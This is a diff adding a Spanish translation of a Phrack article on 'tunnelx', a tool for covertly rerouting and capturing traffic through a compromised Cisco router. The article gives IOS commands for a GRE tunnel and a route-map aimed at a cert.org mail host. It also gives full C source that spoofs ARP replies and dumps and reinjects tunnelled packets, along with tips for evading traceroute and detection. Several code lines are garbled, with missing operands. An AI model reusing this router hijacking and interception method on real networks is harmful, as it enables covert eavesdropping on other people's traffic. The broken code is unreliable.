@@ -1,0 +1,550 @@
+                       - P H R A C K   M A G A Z I N E -
+
+                            Volumen 0xa Numero 0x38
+                                  05.01.2000
+                                  0x0a[0x10]
+
+|------------ COSAS PARA HACER EN CISCOLAND CUANDO ESTAS MUERTO -------------|
+|----------------------------------------------------------------------------|
+|-------------------------- gauis <gaius@hert.org> --------------------------|
+
+
+v0.2 1/1/00
+
+
+----|  1.  Disclaimer
+
+Tunnelx (el codigo) es parte del esfuerzo de investigacion y desarrollo
+conducido por HERT (Hacker Emergency Response Team). No es una herramienta
+de produccion para ataque o defensa con una configuracion de informacion
+de guerra.  En cambio, es un proyecto demostrando concepto de prueba.
+
+Si no eres el receptor indicado, o una persona responsable para darselo
+al receptor indicado, no estas autorizado para eso y no debes revelar,
+copiar, distribuir o retener este mensaje o cualquier parte de el. Tal uso
+inautorizado puede ser ilegal. Si has recibido esta transmision por error,
+por favor envianos un email a hert@hert.org para que podamos arreglar para
+su retorno.
+
+Estas vistas expresadas en este documento no son necesariamente las vistas
+de HERT. Sus directores, oficinistas o empleados no hacen representacion
+o aceptan ninguna responsabilidad por su precision a no ser que este
+establecido expresamente por el contrario.
+
+
+----|  2.  Introduccion
+
+Cuando pienso sobre routers en general, siento exactamente como hago cuando
+voy al supermercado y veo toda esa comida y despues no puedo parar de pensar
+en el mal de la vaca loca, CJD, GMO... Me hace sentir mareado.  Solo ve a
+cisco.com y chequea para que es usado el cisco 7500 y cuantas corporaciones
+son due~os de el y como muchos miles de maquinas rutean a traves de ellos...
+Hay incluso un mapa traceroute en algun lado que puede darte una idea de
+cuan profundamente dependiente somos de esos routers.  Ha pasado un largo
+tiempo desde que deje de creer en la seguridad, el nucleo del problema de
+la seguridad es realmente porque estamos confiando en confianza (lee
+el articulo de Ken Thomsom, relexion sobre confiando en confianza), si
+crei en seguridad cuando no pude estar vendiendo pruebas de penetracion.
+
+Cuantas veces has escuchado a gente diciendo, "Hey, yo me encargo de este
+cisco, seria cool si tuviera IOS src... Podria troyanizarlo y recompilarlo
+y hacer eso y esto.", cuantas veces has escuchado de gente preguntandose
+que mierda pueden hacer con un enable password.  El IOS src ha estado
+flotando alrededor completamente por un tiempo ahora y nadie hizo nada
+con el todavia; al menos no entre los lectores de la regular
+pretendamossercompletamentereveladores bugtraq.
+
+Bueno no necesitas aun realmente el IOS src, todo lo que necesitas ya esta
+ahi, (hay solo una peque~a cosa que seria linda tener del src pero hablaremos
+sobre eso abajo).  Puedes cargar la imagen en IDA, hacer nop out a un par
+de instrucciones y la implementacion rmon de cisco no pondra mas a cero el
+payload si tienes un sniffer IOS.
+
+
+----|  3.  Reenrutamiento demistificado
+
+Lo que quieres hacer es reenrutear algun trafico desde un router y enviarlo
+a algun otro lugar, capturarlo y reenviarlo al router y hacer parecer como
+si nada hubiese pasado. La operacion normal en una config tipica se vera
+como esto:
+
+          Internet  ------------ Cisco ------------ Objetivo
+                               Ethernet0            Serial0
+
+
+
+  Lo que haremos es:
+
+     # telnet cisco
+     Trying 192.168.1.240...
+     Connected to 192.168.1.240.
+     Escape character is '^]'.
+
+
+     User Access Verification
+
+     Password:
+     cisco> enable
+     Password:
+     cisco# configure term
+     Enter configuration commands, one per line.  End with CNTL/Z.
+     cisco(config)# int tunnel0
+     cisco(config-if)# ip address 192.168.0.1 255.255.255.0
+     cisco(config-if)# tunnel mode ?
+       aurp    AURP TunnelTalk AppleTalk encapsulation
+       cayman  Cayman TunnelTalk AppleTalk encapsulation
+       dvmrp   DVMRP multicast tunnel
+       eon     EON compatible CLNS tunnel
+       gre     generic route encapsulation protocol
+       ipip    IP over IP encapsulation
+       nos     IP over IP encapsulation (KA9Q/NOS compatible)
+
+     cisco(config-if)# tunnel mode gre ip
+     cisco(config-if)# tunnel source ?
+       A.B.C.D   ip address
+       BRI       ISDN Basic Rate Interface
+       Dialer    Dialer interface
+       Ethernet  IEEE 802.3
+       Lex       Lex interface
+       Loopback  Loopback interface
+       Null      Null interface
+       Tunnel    Tunnel interface
+     cisco(config-if)# tunnel source Ethernet0/0/0
+     cisco(config-if)# tunnel destination 192.168.1.1
+     cisco(config-if)# ^Z
+     cisco# show interfaces Tunnel0
+     Tunnel0 is up, line protocol is up
+       Hardware is Tunnel
+       Internet address is 192.168.0.1/24
+       MTU 1500 bytes, BW 9 Kbit, DLY 500000 usec, rely 255/255, load 1/255
+       Encapsulation TUNNEL, loopback not set, keepalive set (10 sec)
+       Tunnel source 192.168.1.240 (Ethernet0), destination 192.168.1.1
+       Tunnel protocol/transport GRE/IP, key disabled, sequencing disabled
+       Checksumming of packets disabled,  fast tunneling enabled
+       Last input never, output never, output hang never
+       Last clearing of "show interface" counters never
+       Input queue: 0/75/0 (size/max/drops); Total output drops: 0
+       5 minute input rate 0 bits/sec, 0 packets/sec
+       5 minute output rate 0 bits/sec, 0 packets/sec
+          0 packets input, 0 bytes, 0 no buffer
+          Received 0 broadcasts, 0 runts, 0 giants
+          0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored, 0 abort
+          0 packets output, 0 bytes, 0 underruns
+          0 output errors, 0 collisions, 0 interface resets
+          0 output buffer failures, 0 output buffers swapped out
+     cisco#
+
+En este punto tcpdump no mostrara ningun output a no ser que trates de hacer
+ping a una IP en la red 192.168.0.1/24.  Veras algunos paquetes ICMP
+encapsulados con GRE y algunos paquetes unreach icmp proto 47 viniendo desde
+192.168.1.1.
+
+En tu Linux box de prueba, asegurate de que tienes el protocolo numero 47
+sin proteccion de firewall,
+
+     test# ipchains -I input -p 47 -j ACCEPT          # aceptar protocolo GRE
+     test# modprobe ip_gre
+     test# ip tunnel add tunnel0 mode gre remote 192.168.1.240 local
+     192.168.1.1
+     test# ifconfig tunnel0 192.168.0.2 netmask 255.255.255.0
+     test# ping 192.168.0.2
+     PING 192.168.0.2 (192.168.0.2): 56 data bytes
+     64 bytes from 192.168.0.2: icmp_seq=0 ttl=255 time=0.3 ms
+     ^C
+
+Ok nuestro link esta.  Y como puedes ver por defecto GRE esta realmente
+sin establecer. No hay apreton de manos, ya que no estamos en tierra de
+Microsoft con GRE2 y el estupido PPTP.
+
+     test# tcpdump -i eth1 host 192.168.1.240 and not port 23
+     tcpdump: listening on eth1
+     11:04:44.092895 arp who-has cisco tell private-gw
+     11:04:44.094498 arp reply cisco is-at 0:6d:ea:db:e:ef
+     11:04:44.094528 192.168.0.2 > 192.168.0.1: icmp: echo request (gre encap)
+     11:04:44.097458 192.168.0.1 > 192.168.0.2: icmp: echo reply (gre encap)
+
+El rfc de GRE no es prolijo realmente, y los coders de cisco estan basheados
+en el codigo de implementacion GRE de linux por no respetar su propio RFC.
+
+Miremos a tcpdump src en ftp.ee.lbl.gov.  Los fuentes de tcpdump son lindos;
+en el archivo print-gre.c tenemos la mayoria de la informacion que
+necesitamos para empezar a codear tunnelx.
+
+
+----|  4.  tunnelx - Reenrutamiento transparente IOS y captura
+
+Inicialice un nuevo arbol CVS con libcap y libnet, algunas cabeceras de gre
+rippeadas de tcpdump, relei la pagina man de pcap mientras comia un poco de
+Chunky Monkey, eche una mirada al doc de la API de libnet y limpie los restos
+de pizza y helado de mis dedos y decidi codear algo realmente simple y ver
+si funciona:
+
+- Definimos una direccion IP sin usar que llamamos REENTRY y una direccion
+  ethernet falsa para evitar una tormenta protocol unreachable que llamaremos
+  ETHER_SPOOF.
+- Inicializamos libcap y libnet y configuramos un pcap_loop.
+
+- Luego hacemos un pcap handler, que busque por paquetes IP coincidiendo con
+  el protocolo GRE que iran a la direccion del punto de salida del tunnel
+  como los paquetes de solicitud ARP.
+
+- Nuestro ARP parser saca de apuros si no es una solicitud para REENTRY o
+  envia una respuesta con ETHER_SPOOF.
+
+- Nuestro GRE parser simplemente swapea IP y el codigo de ether y destitucion
+  y escribe el paquete a disco con pcap_dump(), incrementa el ttl, recomputa
+  el checksum y lo flushea con libnet_write.
+
+- Eso es todo!!!  Nunca crei que fuera tan simple.  Ahora viene la parte del
+  truco;  tenemos que configurar el cisco correctamente (definir una lista
+  de acceso con todas las cosas que queremos reenrutar en el).
+
+
+     telnet 192.88.115.98
+     ...
+
+     config term
+     int tunnel0
+       ip address 192.168.0.1 255.255.255.0
+         tunnel mode gre ip
+         tunnel source Ethernet0
+         tunnel destination TUNNELX_REENTRY_IP
+     !
+     access-list 111 permit tcp any host 192.88.209.10 25
+     !
+     route-map certisowned
+       match ip address 111
+       set ip next-hop 192.168.0.7
+     !
+     !
+     interface Ethernet0
+       description to cert.org
+       ip address 192.88.115.98
+       ip policy route-map certisowned
+     ^Z
+
+
+Si tienes a tunnelx setteado y corriendo antes de settear la config de cisco
+entonces funcionara ahora!!!  Y traceroute no muestra nada ya que sus
+paquetes no son coincididos por nuesta lista de acceso!
+
+CUIDADO, sin embargo, cuando quieres desactivar (disable) la configuracion
+de cisco.  Borra el mapa route primero con 'no route-map certisowner' *antes*
+de la lista de acceso de otro modo coincidira los paquetes e iran en un
+loop sin fin.  Pruebalo en un cisco 1600 chico antes de ir a lo salvaje con
+estas cosas.  Tambien trata de no estar alejado del cisco.  La gente solo
+puede saber en que red los paquetes son capturados no el host actual ya que
+somos arp spoofing, entonces toma ventaja de esto.
+
+Dije en la intro que algunos bits del IOS src serian lindos para usar,
+es su codigo crypto.  Puedes configurar un tunel encriptado, que haga uso
+de la misma clave en ambas formas por lo que encriptara paquetes salientes
+y los desencriptara cuando vuelvan.  Tunnelx es casi lo mismo.  Solo
+necesitas agregar la rutina crypto en tu lector pcap para hacer que
+desencripte el trafico.
+
+Oh si, no hable acerca del lector pcap, puedes hacer un peque~o programa
+que parsee el pcap dump desde tunnelx, haga inencapsulable el paquete GRE,
+y cree archivos para cada sesion. lseek() es la clave para hacerlo sin
+perderse de ordenar paquetes o ensuciarse de duplicaciones.  Ya que este
+articulo no esta destinado para el lector avanzado de bugtraq o rootshell,
+el parser pcap dump no esta incluido, puedes enviarme algun dinero si
+necesitas alguna version especial de tunnelx o soporte tecnico.
+
+----|  5.  Saludos y palabras finales
+
+:r !cat greetlist |sort -u |sed -e 's/$/, /'|xargs #hax idlers, acpizer,
+akg, antilove (your piggy coding style is great), awr, binf, cb, cisco9,
+ee.lbl.gov, f1ex, gamma, ice, jarvis, joey, kil3r, klog, meta, minus, nises,
+octa, plaguez, plasmoid, route (thx 4 libnet), scalp, scuzzy, shok, swr,
+teso crew, the owl, tmoggie, ultor, wilkins, ze otros que olvide,
+
+ya estoy trabajando en una nueva version que te dejara hacer spoofing,
+hijacking, y monitorear como en una caza... No olvides que estas en el
+router, puedes hacer todo, y todos confiaran en ti :).
+
+
+----|  6.  El codigo
+<++> p56/Tunnelx/tunnelx.c !0d503a37
+// Tunnelx es parte del esfuerzo de investigacion y desarrollo
+// conducido por HERT. Estas no son herramientas de produccion para ataque o
+// defensa con configuracion de informacion de guerra. En cambio, son peque~as
+// modificaciones demonstrando concepto de prueba.
+// comentarios y cagadas a gaius@hert.org
+
+// para compilar en solaris: (use libnet-0.99g)
+// gcc -O2 -I. -DLIBNET_BIG_ENDIAN -Wall -c tunnelx.c 
+// gcc -O2 tunnelx.o -o tunnelx -lsocket -lnsl libpcap.a libnet.a
+// en linux:
+// gcc -O2 -I. `libnet-config --defines` -c tunnelx.c
+// gcc -O2  tunnelx.o -o tunnelx  libpcap.a libnet.a
+
+  #if (HAVE_CONFIG_H)
+  #include "config.h"
+  #endif
+  #include <libnet.h>
+  #include <pcap.h>
+
+  #define IP_UCHAR_COMP(x, y) \
+      (x[0] == y[0] && x[1] == y[1] && x[2] == y[2] && x[3] == y[3])
+
+  #define GRE_CP          0x8000  /* Checksum Present */
+  #define GRE_RP          0x4000  /* Routing Present */
+  #define GRE_KP          0x2000  /* Key Present */
+  #define GRE_SP          0x1000  /* Sequence Present */
+  #define GRE_SIZE (20)
+  #define GREPROTO_IP     0x0800
+  #define EXTRACT_16BITS(p) \
+          ((u_short)ntohs(*(u_short *)(p)))
+
+  const u_char *packetp;
+  const u_char *snapend;
+
+  #define SNAPLEN 8192
+  #define TUNNELX_REENTRY "192.168.1.1"
+  char out[] = "core";
+  u_long ip_spoof;
+  u_char ether_spoof[6] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEF};
+
+  struct gre_hdr
+  {
+    u_short flags;
+    u_short proto;
+    union
+    {
+      struct gre_ckof
+      {
+        u_short cksum;
+        u_short offset;
+      }
+      gre_ckof;
+      u_long key;
+      u_long seq;
+    }
+    gre_void1;
+    union
+    {
+      u_long key;
+      u_long seq;
+      u_long routing;
+    }
+    gre_void2;
+    union
+    {
+      u_long seq;
+      u_long routing;
+    }
+    gre_void3;
+    union
+    {
+      u_long routing;
+    }
+    gre_void4;
+  };
+
+  struct link_int *li;
+  char default_dev[] = "le0";
+  char *device = NULL;
+
+  void pcap_print (u_char * user, const struct pcap_pkthdr *h,
+                   const u_char * p);
+  char errbuf[256];
+
+  int
+  main (int argc, char *argv[])  
+  {
+    int cnt, c, ret, snaplen;
+    bpf_u_int32 localnet, netmask;
+    char ebuf[PCAP_ERRBUF_SIZE];
+    char pcapexp[50];
+    pcap_t *pd;
+    struct bpf_program fcode;
+    pcap_handler printer;  
+    u_char *pcap_userdata;
+
+    snaplen = SNAPLEN;
+    printer = pcap_print;
+
+    while ((c = getopt (argc, argv, "i:")) != EOF)
+    {
+      switch (c)
+      {
+      case 'i':
+        device = optarg;
+        break;
+      default:
+        exit (EXIT_FAILURE);
+      }
+    }
+
+    //inet_aton (TUNNELX_REENTRY, \_spoof);
+    ip_spoof = libnet_name_resolve(TUNNELX_REENTRY, 0);
+    device = default_dev;
+    if (!device)
+    {
+      fprintf (stderr, "Specify a device\n");
+      exit (EXIT_FAILURE);
+    }
+
+    li = libnet_open_link_interface (device, errbuf);
+    if (!li)
+    {
+      fprintf (stderr, "libnet_open_link_interface: %s\n", errbuf);
+      exit (EXIT_FAILURE);
+    }
+    if (device == NULL)
+      device = pcap_lookupdev (ebuf);
+    if (device == NULL)
+      printf ("%s", ebuf);
+
+    pd = pcap_open_live (device, snaplen, 1, 500, errbuf);
+    if (pd == NULL)
+    {
+      fprintf (stderr, "pcap_open_live: %s\n", errbuf);
+      return (-1);
+    }
+    if (pd == NULL)
+      printf ("%s", ebuf);
+    ret = pcap_snapshot (pd);
+    if (snaplen < ret)
+    {
+      printf ("Snaplen raised from %d to %d\n", snaplen, ret);
+      snaplen = ret;
+    }
+    if (pcap_lookupnet (device, , , ebuf) < 0)
+    {
+      localnet = 0;
+      netmask = 0;
+    }
+    sprintf(pcapexp, "arp or (host %s and proto 47)", TUNNELX_REENTRY);
+    if (pcap_compile (pd,
+                      ,
+                      pcapexp,
+                      1, netmask) < 0)
+      printf ("%s", pcap_geterr (pd));
+
+    if (pcap_setfilter (pd, ) < 0)
+      printf ("%s", pcap_geterr (pd));
+    if (out)
+    {
+      pcap_dumper_t *p = pcap_dump_open (pd, out);
+      pcap_userdata = (u_char *) p;
+    }
+
+    if (pcap_loop (pd, cnt, printer, pcap_userdata) < 0)
+    {
+      (void) fprintf (stderr, "pcap_loop: %s\n", pcap_geterr (pd));
+      exit (1);
+    }
+    pcap_close (pd);
+    exit (0);
+  }
+
+  void
+  pcap_print (u_char * user, const struct pcap_pkthdr *h, const u_char * p)
+  {
+    register struct libnet_ethernet_hdr *eh;
+    register struct gre_hdr *gh;
+    register struct libnet_ip_hdr *ih;
+    register struct libnet_arp_hdr *ah;
+    register char *dst, *src;
+    register u_int ih_length, payload_length, off;
+    u_int length = h->len;
+    u_int caplen = h->caplen;
+    u_short proto;
+    struct ether_addr tmp_ea;
+
+    packetp = p;
+    snapend = p + caplen;
+
+    eh = (struct libnet_ethernet_hdr *) p;
+    p += sizeof (struct libnet_ethernet_hdr);
+    caplen -= sizeof (struct libnet_ethernet_hdr);
+    length -= sizeof (struct libnet_ethernet_hdr);
+
+    switch (ntohs (eh->ether_type))
+    {
+    case ETHERTYPE_IP:
+      ih = (struct libnet_ip_hdr *) p;
+      ih_length = ih->ip_hl * 4;
+      payload_length = ntohs (ih->ip_len);
+      payload_length -= ih_length;
+      off = ntohs (ih->ip_off);
+      if ((off & 0x1fff) == 0)
+      {
+        p = (u_char *) ih + ih_length;
+        src = strdup (inet_ntoa (ih->ip_src));
+        dst = strdup (inet_ntoa (ih->ip_dst));
+        switch (ih->ip_p)
+        {
+  #ifndef IPPROTO_GRE
+  #define IPPROTO_GRE 47
+  #endif
+        case IPPROTO_GRE:
+          gh = (struct gre_hdr *) p;
+          p += 4;
+          if (memcmp (>ip_dst, _spoof, 4) == 0)
+          {
+            // hacer reverse al codigo de GRE y destino
+            memcpy (tmp_ea.ether_addr_octet, >ip_src, 4);
+            memcpy (>ip_src, >ip_dst, 4);
+            memcpy (>ip_dst, tmp_ea.ether_addr_octet, 4);
+            // ih->ip_id++;
+            // hacerse reverse al codigo de Ether y destino
+            memcpy (tmp_ea.ether_addr_octet, eh->ether_shost, ETHER_ADDR_LEN);
+            memcpy (eh->ether_shost, eh->ether_dhost, ETHER_ADDR_LEN);
+            memcpy (eh->ether_dhost, tmp_ea.ether_addr_octet, ETHER_ADDR_LEN);
+            // dopar el ttl
+            ih->ip_ttl = 64;
+            if (libnet_do_checksum ((u_char *) ih, IPPROTO_IP, ih_length) == -1)
+              return;
+
+            if (libnet_write_link_layer (li, device, (u_char *) eh,
+             payload_length + ih_length + sizeof (struct libnet_ethernet_hdr))
+                == -1)
+                return;
+            pcap_dump (user, h, packetp);
+          }
+          proto = EXTRACT_16BITS (>proto);
+          break;
+        default:
+          return;
+        }
+      }
+      break;
+    case ETHERTYPE_ARP:
+      // procesar arp
+      ah = (struct libnet_arp_hdr *) p;
+      if (EXTRACT_16BITS (>ar_op) != ARPOP_REQUEST)
+      {
+        return;
+      }
+      if (memcmp (ah->ar_tpa, _spoof, 4) != 0)
+        return;
+      // swapear codigo ip y direccion uso ar_tha como lugar temporal mantenedor
+      memcpy (ah->ar_tha, ah->ar_spa, 4);
+      memcpy (ah->ar_spa, ah->ar_tpa, 4);
+      memcpy (ah->ar_tpa, ah->ar_tha, 4);
+      // mover codigo ether addr a ambos destinos
+      memcpy (eh->ether_dhost, eh->ether_shost, ETHER_ADDR_LEN);
+      memcpy (ah->ar_tha, eh->ether_shost, ETHER_ADDR_LEN);
+      // copiar la falsa ether addr a ambos codigos
+      memcpy (eh->ether_shost, ether_spoof, ETHER_ADDR_LEN);
+      memcpy (ah->ar_sha, ether_spoof, ETHER_ADDR_LEN);
+      // configurar arp op code para respuesta
+      ah->ar_op = htons (2);
+      if (libnet_write_link_layer (li, device, (u_char *) eh,
+                                   ARP_H + ETH_H) == -1)
+        return;
+      break;
+    }
+  }
+<-->
+
+|EOF|-------------------------------------------------------------------------|
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
